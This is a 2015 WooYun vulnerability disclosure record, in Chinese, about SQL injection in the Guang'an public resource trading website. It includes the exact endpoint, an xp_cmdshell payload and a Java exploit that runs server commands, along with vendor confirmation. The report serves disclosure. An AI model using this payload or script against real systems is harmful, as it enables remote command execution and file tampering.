{"id": 34813, "wybug_id": "wooyun-2015-0105426", "wybug_title": "广安市公共资源交易网POST注入可拿cmdshell", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "WebSOS", "wybug_date": "2015-04-03 14:53", "wybug_open_date": "2015-05-23 08:22", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-23：\t细节向公众公开  简要描述： 广安市公共资源交易网POST注入可拿cmdshellBUG提交过一次,说需要完整的问题复现过程，url，有效的危害证明没有通过，我也是醉了，这就说明审核员压根没有去验证这个BUG是否存在,网址都出来了进去一看有没有BUG一目了然。现在重新提交，附上EXP,其中HttpConnectionUtil为POST协议工具类,希望审核员对待事情认真点，谢谢谅解 详细说明：  \n\nhttp://www.gaggzy.com/Jyweb/XXGKList.aspx?Type=信息公开&SubType=20  信息搜索处惊现SQL语句局部利用方式：提交地址：http://www.gaggzy.com/TrueLoreAjax/TrueLore.Web.WebUI.WebAjaxService,TrueLore.Web.WebUI.ashx提交方式：POSTheader参数：Ajax-method:GetPageXXGK提交数据：[0,15,\"Fbqssj DESC\",\"XXBT\",\"广安\",\"XXGKLX=20 AND FBZT = 1 AND fbqssj<=getdate() ;exec master..xp_cmdshell 'ipconfig'-- \"]1427963120262以此HTTP提交可直接执行cmd命令：ipconfig如图证明：\n\n   漏洞证明：  EXP：\npublic static void main(String[] args) throws UnsupportedEncodingException {\t\tString url=\"http://www.gaggzy.com/TrueLoreAjax/TrueLore.Web.WebUI.WebAjaxService,TrueLore.Web.WebUI.ashx\";\t\tMap<String, String> headers=new HashMap<String, String>();\t\theaders.put(\"Ajax-method\", \"GetPageXXGK\");\t\tString cmd=\"dir d:\";\t\tString postData=\"[0,15,\\\"Fbqssj DESC\\\",\\\"XXBT\\\",\\\"广安\\\",\\\"XXGKLX=20 AND FBZT = 1 AND fbqssj<=getdate() ;exec master..xp_cmdshell '\"+cmd+\"'-- \\\"]1427851919404\";\t\tHttpEntity httpEntity=HttpConnectionUtil.httpPostConn(url, postData, \"UTF-8\", headers);\t\tif(httpEntity!=null){\t\t\tString html= httpEntity.getRenHtml();\t\t\tString []tabStrings=html.split(\",\");\t\t\tfor(int i=0;i<tabStrings.length;i++){\t\t\t\tSystem.out.println(tabStrings[i]);\t\t\t}\t\t}\t}\n\n\n直接操作服务器D盘文件\n\n写入D盘文件\n\n证明写入成功\n\n读取刚才写入的1.txt   修复方案：  过滤或更换成对象型框架   版权声明：转载请注明来源 WebSOS@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-04-08 08:20 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给四川分中心，由其后续协调网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}